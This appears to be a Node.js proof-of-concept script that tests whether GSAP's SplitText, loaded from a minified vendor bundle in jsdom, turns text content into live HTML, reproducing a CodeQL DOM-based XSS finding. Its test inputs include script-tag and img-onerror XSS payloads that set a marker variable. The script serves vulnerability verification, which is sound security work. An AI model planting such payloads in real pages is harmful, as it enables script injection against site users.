// Reproduction for the CodeQL js/xss-through-dom finding against SplitText
// (GSAP) inside a real production vendors.min.js bundle.
//
// Earlier versions of this script tried to locate SplitText by grep'ing for
// a literal minified signature (e.g. "SplitText.create=function create")
// and extracting just that "line" as a standalone CommonJS module. That
// approach is brittle: different builds/minifiers rename the internal
// variables (this bundle emits `E.create=function(t,e){return new E(t,e)}`,
// not the literal string above), and in this bundle SplitText is not on its
// own line or in its own UMD wrapper - it shares a single ~250k-char line
// with the full GSAP core (and other unrelated vendor code) because that's
// how this file's minifier collapsed things.
//
// Instead of parsing out "the SplitText line", this script loads the ENTIRE
// bundle into a real jsdom `window`, exactly as a browser would via a
// <script> tag. Every UMD-wrapped library in the bundle (SplitText/gsap,
// DOMPurify, imagesLoaded, ...) then attaches itself to `window` the same
// way it does in production, so `window.SplitText` is the real, fully wired
// export - no manual extraction or scope-guessing required.
//
// Usage:
//   node poc_test-2.js [path-to-vendors.min.js]   (defaults to ./vendors.min.js)

const fs = require("fs");
const path = require("path");
const { JSDOM } = require("jsdom");

const bundlePath = process.argv[2] || path.join(__dirname, "vendors.min.js");

if (!fs.existsSync(bundlePath)) {
  console.error(`Could not find "${bundlePath}". Pass your vendors.min.js path as an argument:\n  node poc_test-2.js /path/to/vendors.min.js`);
  process.exit(1);
}

const bundleSource = fs.readFileSync(bundlePath, "utf8");

const dom = new JSDOM(
  `<!DOCTYPE html><html><body><div id="target"></div></body></html>`,
  { runScripts: "dangerously" }
);

try {
  dom.window.eval(bundleSource);
} catch (e) {
  console.error(`Bundle threw while loading in jsdom: ${e.message}`);
  process.exit(1);
}

const SplitText = dom.window.SplitText;

if (typeof SplitText !== "function") {
  console.error(`Could not find "window.SplitText" after evaluating ${bundlePath}.\nEither this bundle doesn't include SplitText, or it attaches its export somewhere other than the global window object.`);
  process.exit(1);
}

console.log(`Loaded SplitText from ${path.basename(bundlePath)}, version: ${SplitText.version}\n`);

function runPayload(label, payloadText) {
  console.log(`=== ${label} ===`);
  const target = dom.window.document.getElementById("target");
  target.innerHTML = "";
  target.textContent = payloadText; // the normal, safe way text reaches the page

  console.log("Text node BEFORE SplitText runs (nodeValue): " + JSON.stringify(target.firstChild.nodeValue));

  try {
    SplitText.create(target, { type: "chars,words" });
  } catch (e) {
    console.log("SplitText.create threw:", e.message);
    return;
  }

  console.log("target.innerHTML AFTER SplitText runs:\n" + target.innerHTML);

  const injectedTags = ["b", "img", "script", "svg", "iframe"];
  const found = injectedTags.filter((t) => target.querySelectorAll(t).length > 0);

  console.log(found.length ? `!!! REAL ELEMENTS CREATED: ${found.join(", ")} -> EXPLOITABLE` : "No real elements created -> NOT exploitable");
  console.log("");
}

runPayload("Literal <b> tag inside text", "hello <b>PWNED</b> world");
runPayload("Literal <script> tag inside text", "hi <script>window.__pwned=1<\/script> bye");
runPayload("Literal <img onerror> tag inside text", 'look <img src=x onerror="window.__pwned=2"> here');
